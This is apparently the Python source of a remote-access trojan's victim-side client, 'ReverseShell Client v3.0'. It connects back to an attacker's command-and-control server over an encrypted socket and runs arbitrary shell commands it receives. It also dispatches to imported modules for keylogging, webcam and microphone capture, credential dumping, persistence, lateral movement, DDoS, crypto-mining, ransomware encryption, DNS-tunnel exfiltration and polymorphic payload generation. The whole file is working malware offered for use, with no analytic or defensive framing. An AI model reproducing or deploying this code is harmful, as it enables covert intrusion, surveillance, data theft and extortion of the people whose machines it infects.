#!/usr/bin/env python3
"""
REVERSESHELL CLIENT v3.0 (Victim Machine)
Run this on the target machine to connect back to the attacker
"""

import socket
import subprocess
import os
import json
import sys
import platform
import threading
import traceback
from pathlib import Path
import base64

import config
import crypto
from modules import *


class ReverseShellClient:
    def __init__(self, host: str, port: int):
        self.host = host
        self.port = port
        self.sock = None
        self.running = True

    def connect(self) -> bool:
        """Connect to the server"""
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.connect((self.host, self.port))
            print(f"[+] Connected to {self.host}:{self.port}")
            return True
        except Exception as e:
            print(f"[-] Connection failed: {e}")
            return False

    def send(self, data: str):
        """Encrypt and send data"""
        encrypted = crypto.encrypt(data.encode())
        length = len(encrypted)
        self.sock.sendall(length.to_bytes(4, 'big'))
        self.sock.sendall(encrypted.encode())

    def receive(self) -> str:
        """Receive and decrypt data"""
        length_data = self.sock.recv(4)
        if not length_data:
            return None
        length = int.from_bytes(length_data, 'big')
        encrypted = b''
        while len(encrypted) < length:
            chunk = self.sock.recv(length - len(encrypted))
            if not chunk:
                break
            encrypted += chunk
        decrypted = crypto.decrypt(encrypted.decode())
        return decrypted.decode()

    def get_system_info(self) -> dict:
        """Get system information"""
        return {
            "platform": platform.system(),
            "platform_release": platform.release(),
            "platform_version": platform.version(),
            "architecture": platform.machine(),
            "processor": platform.processor(),
            "username": os.getlogin() if hasattr(os, 'getlogin') else "unknown",
            "hostname": platform.node(),
            "cwd": os.getcwd(),
            "python_version": platform.python_version()
        }

    def execute_command(self, cmd: str) -> str:
        """Execute a command and return output"""
        try:
            result = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                text=True,
                timeout=30
            )
            output = result.stdout + result.stderr
            return json.dumps({
                "success": True,
                "output": output,
                "returncode": result.returncode
            })
        except subprocess.TimeoutExpired:
            return json.dumps({"success": False, "output": "Command timed out", "returncode": -1})
        except Exception as e:
            return json.dumps({"success": False, "output": str(e), "returncode": -1})

    def upload_file(self, filepath: str, content: str) -> dict:
        """Upload a file to the victim machine"""
        try:
            with open(filepath, 'w') as f:
                f.write(content)
            return {"success": True, "message": f"File uploaded: {filepath}", "hash": crypto.hash_file(filepath)}
        except Exception as e:
            return {"success": False, "message": str(e)}

    def download_file(self, filepath: str) -> dict:
        """Download a file from the victim machine"""
        try:
            with open(filepath, 'rb') as f:
                content = f.read()
            return {
                "success": True,
                "content": content.decode('utf-8', errors='replace'),
                "hash": crypto.hash_file(filepath),
                "size": os.path.getsize(filepath)
            }
        except Exception as e:
            return {"success": False, "message": str(e)}

    def list_processes(self) -> list:
        """List running processes"""
        try:
            if platform.system() == "Windows":
                result = subprocess.run("tasklist", shell=True, capture_output=True, text=True)
                return result.stdout.split('\n')[:50]
            else:
                result = subprocess.run("ps aux", shell=True, capture_output=True, text=True)
                return result.stdout.split('\n')[:50]
        except Exception as e:
            return [str(e)]

    # MODULE HANDLERS
    def handle_screenshot(self, payload: dict) -> dict:
        action = payload.get("action", "capture")
        if action == "capture":
            return capture_screenshot(payload.get("quality", 85))
        elif action == "daemon_start":
            return start_screenshot_daemon(payload.get("interval", 30), payload.get("output_dir", "/tmp/rs_screenshots"))
        return {"success": False, "message": "Unknown screenshot action"}

    def handle_keylogger(self, payload: dict) -> dict:
        action = payload.get("action", "start")
        if action == "start":
            return start_keylogger(payload.get("interval", 5))
        elif action == "stop":
            return stop_keylogger()
        elif action == "get":
            return get_keylog(payload.get("clear", True))
        return {"success": False, "message": "Unknown keylogger action"}

    def handle_webcam(self, payload: dict) -> dict:
        action = payload.get("action", "capture")
        if action == "capture":
            return capture_webcam()
        elif action == "video":
            return capture_webcam_video(payload.get("duration", 5))
        elif action == "list":
            return list_cameras()
        return {"success": False, "message": "Unknown webcam action"}

    def handle_microphone(self, payload: dict) -> dict:
        action = payload.get("action", "record")
        if action == "record":
            return record_audio(payload.get("duration", 10))
        elif action == "list_devices":
            return list_audio_devices()
        return {"success": False, "message": "Unknown microphone action"}

    def handle_geolocation(self, payload: dict) -> dict:
        action = payload.get("action", "all")
        if action == "all":
            return get_geolocation()
        elif action == "network":
            return get_network_info()
        return {"success": False, "message": "Unknown geolocation action"}

    def handle_persistence(self, payload: dict) -> dict:
        action = payload.get("action", "install")
        if action == "install":
            return install_persistence(payload.get("payload_path", "client.py"), payload.get("server_ip", self.host), payload.get("port", self.port), payload.get("method", "all"))
        elif action == "uninstall":
            pm = PersistenceManager()
            return pm.uninstall_all()
        return {"success": False, "message": "Unknown persistence action"}

    def handle_proxy(self, payload: dict) -> dict:
        action = payload.get("action", "test")
        if action == "set":
            return proxy_manager.set_proxy(payload.get("proxy_url"))
        elif action == "clear":
            return proxy_manager.clear_proxy()
        elif action == "test":
            return proxy_manager.test_proxy()
        elif action == "check_proxychains":
            return check_proxychains()
        return {"success": False, "message": "Unknown proxy action"}

    def handle_cve(self, payload: dict) -> dict:
        action = payload.get("action", "scan")
        if action == "scan":
            return quick_scan(payload.get("target", "127.0.0.1"))
        elif action == "eternalblue":
            return check_eternalblue(payload.get("target", "127.0.0.1"))
        return {"success": False, "message": "Unknown CVE action"}

    def handle_credentials(self, payload: dict) -> dict:
        action = payload.get("action", "dump_all")
        if action == "dump_all":
            return dump_credentials()
        return {"success": False, "message": "Unknown credentials action"}

    def handle_privesc(self, payload: dict) -> dict:
        action = payload.get("action", "scan")
        if action == "scan":
            return scan_privesc()
        return {"success": False, "message": "Unknown privesc action"}

    def handle_sniffer(self, payload: dict) -> dict:
        action = payload.get("action", "sniff")
        if action == "sniff":
            return sniff_packets(payload.get("count", 100))
        elif action == "network_info":
            return get_sniffer_info()
        return {"success": False, "message": "Unknown sniffer action"}

    def handle_lateral(self, payload: dict) -> dict:
        action = payload.get("action", "enumerate")
        if action == "enumerate":
            return enumerate_network()
        elif action == "ssh":
            lm = LateralMovement()
            return lm.ssh_lateral(payload.get("target"), payload.get("username"), payload.get("password"))
        return {"success": False, "message": "Unknown lateral action"}

    def handle_clipboard(self, payload: dict) -> dict:
        action = payload.get("action", "get")
        if action == "get":
            return get_clipboard()
        elif action == "start_monitor":
            return start_clipboard_monitor(payload.get("interval", 5))
        elif action == "get_history":
            return get_clipboard_history(payload.get("clear", True))
        return {"success": False, "message": "Unknown clipboard action"}

    def handle_screenrecord(self, payload: dict) -> dict:
        action = payload.get("action", "capture")
        if action == "capture":
            return capture_screen()
        elif action == "record":
            return record_screen(payload.get("duration", 30))
        return {"success": False, "message": "Unknown screenrecord action"}

    def handle_beacon(self, payload: dict) -> dict:
        action = payload.get("action", "start")
        if action == "start":
            return start_beacon(payload.get("c2_host", self.host), payload.get("c2_port", self.port), payload.get("interval", 60))
        elif action == "status":
            return get_beacon_status()
        return {"success": False, "message": "Unknown beacon action"}

    def handle_deaddrop(self, payload: dict) -> dict:
        action = payload.get("action", "create")
        dd = DeadDrop()
        if action == "create":
            return dd.create_drop(payload.get("name"), payload.get("data"))
        elif action == "read":
            return dd.read_drop(payload.get("name"))
        elif action == "list":
            return dd.list_drops()
        return {"success": False, "message": "Unknown deaddrop action"}

    def handle_botnet(self, payload: dict) -> dict:
        action = payload.get("action", "ddos")
        if action == "ddos":
            return start_ddos(payload.get("target_ip"), payload.get("target_port"), payload.get("attack_type", "tcp"))
        elif action == "mine":
            return start_mining(payload.get("pool"), payload.get("wallet"))
        return {"success": False, "message": "Unknown botnet action"}

    def handle_ransomware(self, payload: dict) -> dict:
        action = payload.get("action", "encrypt")
        if action == "encrypt":
            return encrypt_files(payload.get("directory", str(Path.home())))
        elif action == "note":
            return create_ransom_note(payload.get("message"))
        return {"success": False, "message": "Unknown ransomware action"}

    def handle_notifications(self, payload: dict) -> dict:
        action = payload.get("action", "get")
        if action == "get":
            return get_notifications()
        elif action == "active_window":
            return get_active_window()
        return {"success": False, "message": "Unknown notifications action"}

    def handle_email(self, payload: dict) -> dict:
        action = payload.get("action", "harvest")
        if action == "harvest":
            return harvest_emails()
        elif action == "imap":
            eh = EmailHarvester()
            return eh.connect_imap(payload.get("server"), payload.get("username"), payload.get("password"))
        return {"success": False, "message": "Unknown email action"}

    def handle_database(self, payload: dict) -> dict:
        action = payload.get("action", "dump")
        if action == "dump":
            return dump_databases()
        elif action == "find":
            return find_database_files()
        return {"success": False, "message": "Unknown database action"}

    def handle_dns_tunnel(self, payload: dict) -> dict:
        action = payload.get("action", "send")
        if action == "send":
            return send_dns_data(payload.get("domain"), payload.get("data"))
        elif action == "exfiltrate_file":
            return exfiltrate_file_dns(payload.get("domain"), payload.get("filepath"))
        return {"success": False, "message": "Unknown dns_tunnel action"}

    def handle_polymorphic(self, payload: dict) -> dict:
        action = payload.get("action", "generate")
        if action == "generate":
            return generate_payload(payload.get("c2_host", self.host), payload.get("c2_port", self.port), payload.get("method", "all"))
        elif action == "one_liner":
            return {"payload": generate_one_liner(payload.get("c2_host", self.host), payload.get("c2_port", self.port), payload.get("method", "base64"))}
        return {"success": False, "message": "Unknown polymorphic action"}

    def run(self):
        """Main client loop"""
        if not self.connect():
            return

        self.send(json.dumps({"type": "info", "data": self.get_system_info()}))

        while self.running:
            try:
                cmd = self.receive()
                if not cmd:
                    break

                data = json.loads(cmd)
                command_type = data.get("type", "exec")
                payload = data.get("payload", "")

                response = {"type": "response"}

                if command_type == "exec":
                    response["data"] = self.execute_command(payload)
                elif command_type == "upload":
                    response["data"] = self.upload_file(payload["path"], payload["content"])
                elif command_type == "download":
                    response["data"] = self.download_file(payload)
                elif command_type == "processes":
                    response["data"] = self.list_processes()
                elif command_type == "pwd":
                    response["data"] = os.getcwd()
                elif command_type == "disconnect":
                    self.running = False
                    break
                # MODULE COMMANDS
                elif command_type == "screenshot":
                    response["data"] = self.handle_screenshot(payload)
                elif command_type == "keylogger":
                    response["data"] = self.handle_keylogger(payload)
                elif command_type == "webcam":
                    response["data"] = self.handle_webcam(payload)
                elif command_type == "microphone":
                    response["data"] = self.handle_microphone(payload)
                elif command_type == "geolocation":
                    response["data"] = self.handle_geolocation(payload)
                elif command_type == "persistence":
                    response["data"] = self.handle_persistence(payload)
                elif command_type == "proxy":
                    response["data"] = self.handle_proxy(payload)
                elif command_type == "cve":
                    response["data"] = self.handle_cve(payload)
                elif command_type == "credentials":
                    response["data"] = self.handle_credentials(payload)
                elif command_type == "privesc":
                    response["data"] = self.handle_privesc(payload)
                elif command_type == "sniffer":
                    response["data"] = self.handle_sniffer(payload)
                elif command_type == "lateral":
                    response["data"] = self.handle_lateral(payload)
                elif command_type == "clipboard":
                    response["data"] = self.handle_clipboard(payload)
                elif command_type == "screenrecord":
                    response["data"] = self.handle_screenrecord(payload)
                elif command_type == "beacon":
                    response["data"] = self.handle_beacon(payload)
                elif command_type == "deaddrop":
                    response["data"] = self.handle_deaddrop(payload)
                elif command_type == "botnet":
                    response["data"] = self.handle_botnet(payload)
                elif command_type == "ransomware":
                    response["data"] = self.handle_ransomware(payload)
                elif command_type == "notifications":
                    response["data"] = self.handle_notifications(payload)
                elif command_type == "email":
                    response["data"] = self.handle_email(payload)
                elif command_type == "database":
                    response["data"] = self.handle_database(payload)
                elif command_type == "dns_tunnel":
                    response["data"] = self.handle_dns_tunnel(payload)
                elif command_type == "polymorphic":
                    response["data"] = self.handle_polymorphic(payload)

                self.send(json.dumps(response))

            except Exception as e:
                try:
                    self.send(json.dumps({"type": "error", "data": str(e) + "\n" + traceback.format_exc()}))
                except:
                    break

        self.sock.close()
        print("[+] Disconnected")


def main():
    host = config.HOST
    port = config.PORT

    if len(sys.argv) >= 3:
        host = sys.argv[1]
        port = int(sys.argv[2])

    print(f"[*] ReverseShell Client v3.0")
    print(f"[*] Connecting to {host}:{port}...")

    client = ReverseShellClient(host, port)
    client.run()


if __name__ == "__main__":
    main()
